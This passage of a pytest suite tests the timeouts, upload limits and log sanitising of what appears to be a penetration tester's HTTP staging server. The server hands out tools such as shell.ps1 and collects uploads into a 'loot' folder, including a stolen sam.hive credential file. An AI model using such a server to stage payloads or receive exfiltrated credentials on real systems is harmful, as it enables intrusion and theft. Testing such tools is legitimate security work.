        serving.stop(session.paths)
    log = serving.log_tail(session.paths, 50)
    assert any(f"PUT {s}/sam.hive HTTP/1.1  201  saved loot/sam.hive" in line for line in log)
    assert any(f"PUT {s}/sam.hive HTTP/1.1  201  saved loot/sam-2.hive" in line for line in log)


# ---- a client that goes quiet, hangs up or sends too much


QUIET = 1.0


@pytest.fixture
def live(served):
    """The server's own classes answering on loopback, in a thread of this process, with one
    second where the real one waits thirty. The port, the upload folder and the lines logged."""
    folder, tools = served
    logged: list[str] = []
    handler = serving._handler(folder, tools, SECRET, logged.append, idle=QUIET)
    server = serving._Server(("127.0.0.1", 0), handler, logged.append)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        yield server.server_address[1], folder, logged
    finally:
        server.shutdown()
        server.server_close()


def until(done, wait=5.0):
    deadline = time.monotonic() + wait
    while not done() and time.monotonic() < deadline:
        time.sleep(0.02)
    return done()


def everything(sock):
    """All the server sends until it closes the connection."""
    data = b""
    while piece := sock.recv(65536):
        data += piece
    return data


def test_the_server_waits_thirty_seconds_for_a_quiet_connection():
    handler = serving._handler(Path("upload"), Path("tools"), SECRET, print)
    assert handler.timeout == serving.IDLE_TIMEOUT == 30.0


def test_a_connection_that_asks_nothing_is_closed(live):
    port, _, _ = live
    with socket.create_connection(("127.0.0.1", port), timeout=5) as idle:
        began = time.monotonic()
        assert everything(idle) == b""
        assert time.monotonic() - began < 4
    # and one that stops in the middle of its request
    with socket.create_connection(("127.0.0.1", port), timeout=5) as idle:
        idle.sendall(f"GET /{SECRET}/shell.ps1 HTTP/1.1\r\nHost:".encode())
        assert everything(idle) == b""


def test_an_upload_that_goes_quiet_gives_back_its_room_and_leaves_nothing(live, monkeypatch):
    from collections import namedtuple

    port, folder, logged = live
    loot = folder.parent / "loot"
    size = serving.MAX_RECEIVE
    usage = namedtuple("usage", "total used free")
    monkeypatch.setattr(serving.shutil, "disk_usage", lambda path: usage(0, 0, serving.ROOM_LEFT + size))
    with socket.create_connection(("127.0.0.1", port), timeout=5) as quiet:
        quiet.sendall(f"PUT /{SECRET}/big.bin HTTP/1.1\r\nHost: x\r\nContent-Length: {size}\r\n\r\nsome".encode())
        # while it is waited for, the room is promised to it and its part is in loot/
        assert until(lambda: serving._PROMISED.bytes == size)
        assert put("127.0.0.1", port, f"/{SECRET}/small.txt", b"x")[0] == 507
        assert [p.name.startswith(".pwn-broker-") for p in loot.iterdir()] == [True]
        answer = everything(quiet)
    assert answer.startswith(b"HTTP/1.1 408 ") and answer.endswith(b"\r\n\r\ntimed out\n")
    assert until(lambda: serving._PROMISED.bytes == 0)
    assert list(loot.iterdir()) == []
    assert put("127.0.0.1", port, f"/{SECRET}/small.txt", b"x") == (201, b"saved small.txt\n")
    assert [line.split("  ", 2)[2] for line in logged] == [
        f"PUT /{SECRET}/small.txt HTTP/1.1  507",
        f"PUT /{SECRET}/big.bin HTTP/1.1  408",
        f"PUT /{SECRET}/small.txt HTTP/1.1  201  saved loot/small.txt",
    ]


def test_an_upload_sent_slowly_but_never_quiet_is_taken(live):
    port, folder, _ = live
    with socket.create_connection(("127.0.0.1", port), timeout=5) as slow:
        slow.sendall(f"PUT /{SECRET}/slow.bin HTTP/1.1\r\nHost: x\r\nContent-Length: 6\r\nConnection: close\r\n\r\n".encode())
        for piece in (b"ab", b"cd", b"ef"):
            time.sleep(QUIET * 0.6)
            slow.sendall(piece)
        assert everything(slow).endswith(b"saved slow.bin\n")
    assert (folder.parent / "loot" / "slow.bin").read_bytes() == b"abcdef"


def test_a_client_that_hangs_up_part_of_the_way_is_one_line_in_the_log(live, capfd):
    port, folder, logged = live
    with open(folder / "big.bin", "wb") as fh:
        fh.truncate(64 * 1024**2)
    hung = socket.create_connection(("127.0.0.1", port), timeout=5)
    hung.sendall(f"GET /{SECRET}/big.bin HTTP/1.1\r\nHost: x\r\n\r\n".encode())
    assert hung.recv(1000).startswith(b"HTTP/1.1 200 ")
    # closed with a reset, as a killed client's connection is
    hung.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, __import__("struct").pack("hh" if os.name == "nt" else "ii", 1, 0))
    hung.close()
    assert until(lambda: len(logged) == 2)
    assert logged[0].endswith(f"  127.0.0.1  GET /{SECRET}/big.bin HTTP/1.1  200")
    stamp, address, said = logged[1].split("  ", 2)
    assert len(stamp) == len("2026-11-14 12:00:00") and address == "127.0.0.1"
    assert said.startswith("the connection ended early: ") and "\n" not in said
    # nothing more reaches the log: the server's own output is appended to that same file
    time.sleep(0.2)
    captured = capfd.readouterr()
    assert captured.err == "" and captured.out == ""


def test_an_error_that_is_no_dropped_connection_is_one_line_too(live, monkeypatch, capfd):
    port, _, logged = live

    def broken(*args):
        raise RuntimeError("line one\nline two " + "x" * 500)

    monkeypatch.setattr(serving, "find", broken)
    with socket.create_connection(("127.0.0.1", port), timeout=5) as asked:
        asked.sendall(f"GET /{SECRET}/shell.ps1 HTTP/1.1\r\nHost: x\r\n\r\n".encode())
        assert everything(asked) == b""
    assert until(lambda: len(logged) == 1)
    said = logged[0].split("  ", 2)[2]
    assert said == "the connection ended early: " + ("RuntimeError: line one?line two " + "x" * 500)[:200] + "..."
    assert capfd.readouterr().err == ""


def test_a_long_request_line_is_cut_in_the_log(live):
    port, _, logged = live
    assert fetch("127.0.0.1", port, "/" + "A" * 60000) == (404, b"not found\n")
    assert fetch("127.0.0.1", port, "/short") == (404, b"not found\n")
    assert [line.split("  ", 2)[2] for line in logged] == ["GET /" + "A" * 195 + "...  404", "GET /short HTTP/1.1  404"]


def test_a_control_character_in_a_request_line_is_still_shown_as_a_question_mark(live):
    port, _, logged = live
    with socket.create_connection(("127.0.0.1", port), timeout=5) as asked:
        asked.sendall(b"GET /a\x1b[2Jb\x07 HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
        everything(asked)
    [line] = logged
    assert line.split("  ", 2)[2].startswith("GET /a?[2Jb? HTTP/1.1  4")
